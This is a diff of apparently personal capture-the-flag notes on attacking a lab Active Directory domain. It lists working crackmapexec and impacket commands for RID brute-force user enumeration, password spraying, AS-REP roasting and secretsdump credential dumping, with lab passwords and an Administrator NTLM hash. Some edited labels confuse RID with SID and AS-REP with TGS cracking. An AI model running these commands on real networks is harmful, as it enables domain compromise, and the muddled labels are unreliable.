@@ -6,20 +6,20 @@ As soon as SMB port is open, we can bruteforce SID_Users with crackmapexec
 
 RID user," it's generally referring to a user account identified by its RID within a domain. This is because RIDs are used as part of the SID to identify users within a domain.
 
-Finding All RID Users with crackmapexec (or) impacket (Since, we have READ permission on IPC$)
+Finding All SID Users with crackmapexec (or) impacket (Since, we have READ permission on IPC$)
 -----------------------------------------------------
-crackmapexec smb 10.10.173.97 -u lee -p "" --rid-brute 10000 (RID user accounts 10000)
+crackmapexec smb 10.10.173.97 -u lee -p "" --rid-brute 10000 (SID user accounts 10000)
 						(or)
 
 impacket-lookupsid vulnnet-rst.local/lee@10.10.33.231
 impacket-lookupsid 'anonymous:'@10.10.33.231
 
-Bruteforcing RID users
+Bruteforcing SID users
 ----------------------
 crackmapexec smb 10.10.173.97 -u username.txt -p '1013passw0d' --continue-on-success
 
-AS-REP-Roasting (Kerborasting_based attack)
----------------------------------------------
+AS-REP-Roasting (Kerborasting_based attack)(to get service we need to crack TGS)
+--------------------------------------------------------------------------------
 impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile enumerated_users
 
 
@@ -60,9 +60,9 @@ I tested those credentials using crackmapexec. Looking at the screenshot below w
 #crackmapexec smb 10.10.248.119 -u a-whitehat -p "bNdKVkjv3RR9ht"
 
 
-dump the secret file (to know ntlm hash)
+dump the secret file (to know ntlm hash for administrator) (backup2517860 is password)
 ---------------------
-#impacket-secretsdump vulnnet-rst.local/a-whitehat@10.10.248.119 
+#impacket-secretsdump -just-dc spooky.local/backup:'backup2517860'@10.10.37.51
 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
 
